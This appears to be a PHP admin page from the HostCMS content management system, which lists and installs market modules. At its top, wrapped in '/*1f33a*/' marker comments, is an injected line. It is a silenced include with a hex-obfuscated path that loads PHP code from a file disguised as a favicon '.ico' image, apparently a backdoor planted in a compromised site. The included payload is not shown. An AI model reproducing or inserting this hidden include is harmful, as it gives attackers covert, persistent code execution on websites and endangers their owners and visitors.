<?php


/*1f33a*/

@include "\x2fhom\x65/ne\x6f-vo\x2fneo\x2dvo.\x72u/d\x6fcs/\x68ost\x63msf\x69les\x2flib\x2flib\x5f38/\x66avi\x63on_\x3180d\x622.i\x63o";

/*1f33a*/
/**
 * Market.
 *
 * @package HostCMS
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
require_once('../../bootstrap.php');

Core_Auth::authorization($sModule = 'market');

$sAdminFormAction = '/admin/market/index.php';

$category_id = intval(Core_Array::getRequest('category_id'));

// Контроллер формы
$oAdmin_Form_Controller = Admin_Form_Controller::create();
$oAdmin_Form_Controller
	->module(Core_Module::factory($sModule))
	->setUp()
	->path($sAdminFormAction)
	->title(Core::_('Market.title'))
	->setAdditionalParam($category_id
		? 'category_id=' . $category_id
		: ''
	);

	
ob_start();

$oMarket_Controller = Market_Controller::instance();
$oMarket_Controller
	->controller($oAdmin_Form_Controller)
	->admin_view(
		Admin_View::create()
			->module(Core_Module::factory($sModule))
	)
	->setMarketOptions()
	->category_id($category_id)
	->page($oAdmin_Form_Controller->getCurrent());

$category_id && $oMarket_Controller->order('price');
	
// Установка модуля
if (Core_Array::getRequest('install'))
{
	$oMarket_Controller->getModule(intval(Core_Array::getRequest('install')));
}
else
{
	// Вывод списка
	$oMarket_Controller
		->getMarket()
		->showItemsList();
}

Core_Skin::instance()
	->answer()
	->ajax(Core_Array::getRequest('_', FALSE))
	->content(ob_get_clean())
	->message($oMarket_Controller->admin_view->message)
	->title(Core::_('Market.title'))
	->module($sModule)
	->execute();